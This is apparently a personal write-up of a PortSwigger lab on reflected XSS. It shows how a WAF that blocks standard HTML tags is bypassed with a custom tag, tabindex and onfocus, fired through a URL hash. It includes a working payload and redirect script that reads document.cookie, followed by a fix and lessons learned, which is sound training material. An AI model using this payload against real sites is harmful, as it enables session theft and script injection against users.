# Reflected XSS into HTML Context (All Standard Tags Blocked)
---
## TARGET
PortSwigger Web Security Academy  
Lab: _Reflected XSS into HTML context with all standard tags blocked_
Vulnerability: _Reflected XSS (WAF Bypass via Custom Tags)_

---
## DESCRIPTION
The application is protected by a WAF that blocks all standard HTML tags (`<script>`, `<body>`, `<img>`, `<iframe>`, etc.). However, the application fails to block "Custom" or non-standard HTML tags. This allows an attacker to inject a user-defined tag and execute JavaScript using specific event handlers that do not require user interaction.

---
## ROOT CAUSE
**Allowing Custom Tags & Attribute Injection:** The WAF relies on a denylist of known HTML tags. It does not sanitize unknown tags (e.g., `<custom>`). Browsers render unknown tags as generic inline elements (similar to `<span>`). By injecting a custom tag with `tabindex`, the attacker can make the element focusable, enabling the use of the `onfocus` event handler.

---
## ATTACK SCENARIO
1. **Fuzzing:** The attacker determines that standard tags return `400 Bad Request`, but random tags like `<xss>` return `200 OK`.
2. **Weaponization:**
    - The attacker injects `<xss id=x tabindex=1 onfocus=alert(document.cookie)>`.
    - **`tabindex=1`**: Makes the custom element interactable/focusable.
    - **`id=x`**: Gives the element a targetable name.
3. **Trigger (The Hash):** The attacker appends `#x` to the URL.
4. **Execution:** When the victim visits the link, the browser automatically focuses on the element with `id="x"` (due to the hash). This triggers the `onfocus` event, executing the payload.
---
## PROOF OF CONCEPT
### Bypass Vector
- **Tag:** `<xss>` (Custom)
- **Attributes:** `tabindex=1`, `onfocus`, `id`
### Exploit Code (Exploit Server)
```JavaScript
<script>
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

---
## IMPACT
**Medium/High:** Bypasses WAF protections to achieve execution of arbitrary JavaScript. The need for an external redirect (Exploit Server) slightly increases complexity, but the effect is a fully automated attack on the victim.

---
## FIX / MITIGATION
**Output Encoding:** Do not rely on blocking specific tags. All user input should be HTML-encoded (`<` becomes `&lt;`) before being reflected. This renders any tag, custom or standard, harmless.

---
## KEY LEARNING
**The Browser is Forgiving.** Browsers try to render "broken" or "unknown" HTML rather than crashing. A WAF might block `<img>` because it knows it's dangerous, but it ignores `<anytag>` because it doesn't recognize it. Security Engineers must remember that **unknown** inputs are often treated as valid structural elements by the browser.

---
